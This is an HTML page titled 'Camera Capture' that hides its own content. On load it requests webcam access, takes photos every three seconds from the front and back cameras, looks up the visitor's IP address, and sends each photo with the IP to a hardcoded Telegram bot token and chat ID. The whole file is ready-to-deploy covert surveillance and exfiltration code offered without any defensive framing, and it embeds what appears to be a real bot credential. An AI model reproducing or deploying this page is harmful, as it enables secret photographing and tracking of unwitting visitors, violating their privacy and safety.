<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>Camera Capture</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      display: none; /* Hide the body */
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
  </style>
</head>
<body>

  <script type="text/javascript">
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
    const chatId = '5571330102'; // Your Telegram chat ID

    // Function to get user's IP address
    function getUserIP() {
      return new Promise((resolve, reject) => {
        $.get('https://api.ipify.org?format=json', function(data) {
          resolve(data.ip);
        }).fail(function() {
          reject('Unable to fetch IP');
        });
      });
    }

    // Start capturing photos
    function startCapturing() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);

          // Capture photos from front and back cameras
          function capturePhoto() {
            imageCapture.takePhoto()
              .then((blob) => {
                getUserIP().then((ip) => {
                  sendToTelegram(blob, ip);
                }).catch(error => {
                  console.error('IP Fetch Error:', error);
                });
              })
              .catch((error) => {
                console.error('Error capturing photo:', error);
              });
          }

          // Switch to back camera and capture photo
          function switchToBackCamera() {
            const backImageCapture = new ImageCapture(stream.getVideoTracks()[1]);
            backImageCapture.takePhoto()
              .then((blob) => {
                getUserIP().then((ip) => {
                  sendToTelegram(blob, ip);
                }).catch(error => {
                  console.error('IP Fetch Error:', error);
                });
              })
              .catch((error) => {
                console.error('Error capturing back photo:', error);
              });
          }

          // Set intervals to capture photos continuously from front and back cameras
          let capturingFront = true;
          setInterval(() => {
            if (capturingFront) {
              capturePhoto();  // Front camera photo
            } else {
              switchToBackCamera();  // Back camera photo
            }
            capturingFront = !capturingFront;
          }, 3000); // Capture a photo every 3 seconds

        })
        .catch((error) => {
          console.error('Permission error:', error);
        });
    }

    // Send photo and user IP to Telegram bot
    function sendToTelegram(data, ip) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', data, 'camera_photo.jpg');
      formData.append('caption', `User IP: ${ip}`);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Error sending to Telegram:', error));
    }

    window.onload = function() {
      startCapturing(); // Start capturing as soon as the page loads
    };

  </script>

</body>
</html>
